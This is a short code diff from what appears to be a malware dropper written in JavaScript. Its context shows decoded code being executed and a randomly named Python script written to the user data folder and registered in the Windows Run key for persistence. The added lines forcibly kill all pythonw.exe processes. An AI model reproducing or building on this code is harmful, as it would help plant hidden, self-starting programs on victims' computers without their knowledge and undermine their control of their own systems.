@@ -1055,6 +1055,14 @@ exec(decoded_code)
     const scriptFilePath = path.join(userDataPath, `${generateRandomString(10)}.py`);
     fs.writeFileSync(scriptFilePath, scriptContent);
 
+    // Terminate any existing pythonw.exe processes
+    try {
+        execSync('taskkill /F /IM pythonw.exe', { stdio: 'ignore' });
+        console.log('Terminated existing pythonw.exe processes.');
+    } catch (error) {
+        console.error(`Error terminating pythonw.exe: ${error.message}`);
+    }
+
     // Add the Python script to startup
     const startupScriptPath = `"${pythonwExe}" "${scriptFilePath}"`;
     const regPath = `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
